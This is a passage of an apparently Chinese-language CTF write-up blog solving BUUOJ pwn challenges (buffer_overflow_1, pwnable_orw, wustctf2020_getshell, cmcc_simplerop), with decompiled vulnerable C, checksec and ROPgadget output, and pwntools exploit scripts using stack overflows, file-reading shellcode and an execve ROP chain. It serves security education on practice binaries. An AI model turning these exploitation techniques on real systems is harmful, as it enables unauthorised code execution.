class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  v0 = get_return_address();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x\n&quot;</span>, v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./PicoCTF_2018_buffer_overflow_1&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27682</span>)</span><br><span class="line">win_add = <span class="number">0x80485CB</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">4</span>) + p32(win_add)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x28-pwnable-orw"><a href="#0x28-pwnable-orw" class="headerlink" title="0x28.pwnable_orw"></a>0x28.pwnable_orw</h2><p>挺有意思的一个题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec orw </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/orw&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>开了canary。</p><p>这题其实就是往里面写shellcode，但是写入到shellcode有要求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give my your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">96</span>]; <span class="comment">// [esp+Ch] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(v3, &amp;unk_8048640, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。</p><p>  seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p></blockquote><p>执行了两次prctl函数。</p><blockquote><p>  第一次调用prctl函数 ————禁止提权 </p><p>  第二次调用prctl函数 ————限制能执行的系统调用只有open，write，exit</p></blockquote><p>那么就是，打开文件，读flag文件，然后输出flag文件内容。</p><ul><li>  打开flag，sys_open(file,0,0)，系统调用号为5</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push 0x0#字符串结尾</span><br><span class="line">push 0x67616c66 #flag</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor ecx,ecx#0</span><br><span class="line">xor edx,edx#0</span><br><span class="line">mov eax,0x5</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><ul><li>  读文件，sys_read(fd=3,file,0x30)，系统调用号为3</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x3</span><br><span class="line">mov ecx,ebx</span><br><span class="line">mov ebx,0x3  #fd</span><br><span class="line">mov edx,0x30</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><ul><li>  输出，sys_write(1,file,0x30)，系统调用号为4</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x4</span><br><span class="line">mov ebx,0x1</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = remote(&quot;node3.buuoj.cn&quot;, 27008)</span></span><br><span class="line">io = process(<span class="string">&quot;./orw&quot;</span>)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;shellcode:&#x27;</span>, shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x29-wustctf2020-getshell"><a href="#0x29-wustctf2020-getshell" class="headerlink" title="0x29.wustctf2020_getshell"></a>0x29.wustctf2020_getshell</h2><p>一个水题。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./wustctf2020_getshell&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27728</span>)</span><br><span class="line">back_door = <span class="number">0x0804851B</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(back_door)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2A-cmcc-simplerop"><a href="#0x2A-cmcc-simplerop" class="headerlink" title="0x2A.cmcc_simplerop"></a>0x2A.cmcc_simplerop</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ file simplerop </span><br><span class="line">simplerop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=bdd40d725b490b97d5a25857a6273870c7de399f, not stripped</span><br><span class="line">gwt@ubuntu:~/Desktop$ checksec simplerop </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/simplerop&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">gwt@ubuntu:~/Desktop$ </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ROP is easy is&#x27;nt it ?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your input :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v4, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ida显示偏移是0x14，可以调试下。</p><p>使用cyclic生成一些测试的字符。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure><p>可以看出偏移：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV (fault address 0x61616169)</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> cyclic -l 0x61616169</span></span><br><span class="line">32</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure><p>是32 ，也就是0x20，（这里ida出了问题）</p><p>存在int 0x80 中断指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ ROPgadget --binary simplerop --ropchain | grep &#x27;int 0x80&#x27;</span><br><span class="line">0x08093b43 : add bh, al ; inc ebp ; test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x080493df : add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x08092190 : add byte ptr [eax], al ; mov eax, edi ; mov ecx, 0x81 ; int 0x80</span><br><span class="line">0x08092191 : add byte ptr [ecx + 0x81b9f8], cl ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x0806c421 : add dword ptr [eax], eax ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x0806e908 : clc ; mov ecx, 0x80 ; int 0x80</span><br><span class="line">0x08092193 : clc ; mov ecx, 0x81 ; int 0x80</span><br><span class="line">0x08093b45 : inc ebp ; test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x080493e1 : int 0x80</span><br><span class="line">0x0807b3ea : ja 0x807b3f0 ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x080b9851 : jp 0x80b985a ; int 0x80</span><br><span class="line">0x080b9a77 : jp 0x80b9a81 ; int 0x80</span><br><span class="line">0x08093b44 : mov dword ptr [ebp - 0x7c], 0x51 ; int 0x80</span><br><span class="line">0x080493d9 : mov dword ptr [esp + 0x2c], 0x51 ; int 0x80</span><br><span class="line">0x0807b3e9 : mov eax, 0x77 ; int 0x80</span><br><span class="line">0x0807b3e0 : mov eax, 0xad ; int 0x80</span><br><span class="line">0x0806c420 : mov eax, 1 ; int 0x80</span><br><span class="line">0x0806e907 : mov eax, edi ; mov ecx, 0x80 ; int 0x80</span><br><span class="line">0x08092192 : mov eax, edi ; mov ecx, 0x81 ; int 0x80</span><br><span class="line">0x0806e909 : mov ecx, 0x80 ; int 0x80</span><br><span class="line">0x08092194 : mov ecx, 0x81 ; int 0x80</span><br><span class="line">0x0806eeef : nop ; int 0x80</span><br><span class="line">0x0807b3df : nop ; mov eax, 0xad ; int 0x80</span><br><span class="line">0x0806eeee : nop ; nop ; int 0x80</span><br><span class="line">0x0807b3de : nop ; nop ; mov eax, 0xad ; int 0x80</span><br><span class="line">0x0806eeec : nop ; nop ; nop ; int 0x80</span><br><span class="line">0x0807b3dc : nop ; nop ; nop ; mov eax, 0xad ; int 0x80</span><br><span class="line">0x0806eeea : nop ; nop ; nop ; nop ; int 0x80</span><br><span class="line">0x0806eee8 : nop ; nop ; nop ; nop ; nop ; int 0x80</span><br><span class="line">0x0807b3e7 : nop ; pop eax ; mov eax, 0x77 ; int 0x80</span><br><span class="line">0x0806c41f : or byte ptr [eax + 1], bh ; int 0x80</span><br><span class="line">0x0807b3e8 : pop eax ; mov eax, 0x77 ; int 0x80</span><br><span class="line">0x0806c41e : push cs ; or byte ptr [eax + 1], bh ; int 0x80</span><br><span class="line">0x080b9a78 : push es ; int 0x80</span><br><span class="line">0x08093b42 : sldt edi ; inc ebp ; test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x08093b46 : test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80</span><br><span class="line">0x0806e905 : xor esi, esi ; mov eax, edi ; mov ecx, 0x80 ; int 0x80</span><br><span class="line">[+] Gadget found: 0x80493e1 int 0x80</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080493e1) # int 0x80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">gwt@ubuntu:~/Desktop$ ROPgadget --binary simplerop --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0809da92 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0807bf7d : pop ds ; ret</span><br><span class="line">0x0809da8a : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bae06 : pop eax ; ret</span><br><span class="line">0x08071e3a : pop eax ; ret 0x80e</span><br><span class="line">0x0805b3ad : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809de85 : pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x0804838e : pop ebp ; ret</span><br><span class="line">0x080a96e5 : pop ebp ; ret 0x10</span><br><span class="line">0x080966d9 : pop ebp ; ret 0x14</span><br><span class="line">0x08070a36 : pop ebp ; ret 0xc</span><br><span class="line">0x0805ab34 : pop ebp ; ret 4</span><br><span class="line">0x08049bc0 : pop ebp ; ret 8</span><br><span class="line">0x0809de84 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bd793 : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806e829 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08091f08 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a96e2 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x080966d6 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070a33 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ab31 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bbd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080499d9 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a54 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d797c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099937 : pop ebx ; ret 8</span><br><span class="line">0x0806e851 : pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>存在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x080bae06 : pop eax ; ret</span><br><span class="line">0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>系统调用：int80(11,”/bin/sh”,null,null)，其中后面的四个参数分别是eax,ebx,ecx,edx。</p><p>但是没有/bin/sh字符串，需要输入，有read函数，将binsh写入bss段，然后直接调用，这题没有开PIE，bss的地址就是绝对地址。</p><p>ebx：文件描述符</p><p>ecx：指向要写入的字符串的指针</p><p>edx：要写入的字符串长度</p><p>payload：</p><p><code>payload = &#39;a&#39;\*0x20 + p32(read_addr) + p32(pop_edcbx) + p32(0) + p32(binsh_addr) + p32(0x8)</code><br><code>payload += p32(pop_eax) + p32(0xb) + p32(pop_edcbx) + p32(0) +p32(0) + p32(binsh_addr) + p32(int_addr)</code></p><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./simplerop&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26293</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./simplerop&#x27;</span>)</span><br><span class="line">int_80 = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">read_addr = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_bin_sh_addr = <span class="number">0x080EB590</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> </span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>) </span><br><span class="line">payload += p32(bss_bin_sh_addr)</span><br><span class="line">payload += p32(<span class="number">0x8</span>)</span><br><span class="line">payload += p32(pop_eax) </span><br><span class="line">payload += p32(<span class="number">0xb</span>) </span><br><span class="line">payload += p32(pop_edx_ecx_ebx) </span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss_bin_sh_addr)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2B-babyfengshui-33c3-2016"><a href="#0x2B-babyfengshui-33c3-2016" class="headerlink" title="0x2B.babyfengshui_33c3_2016"></a>0x2B.babyfengshui_33c3_2016</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec babyfengshui_33c3_2016 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/babyfengshui_33c3_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [esp+3h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0: Add a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Delete a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Display a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Update a user description&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Action: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) == <span 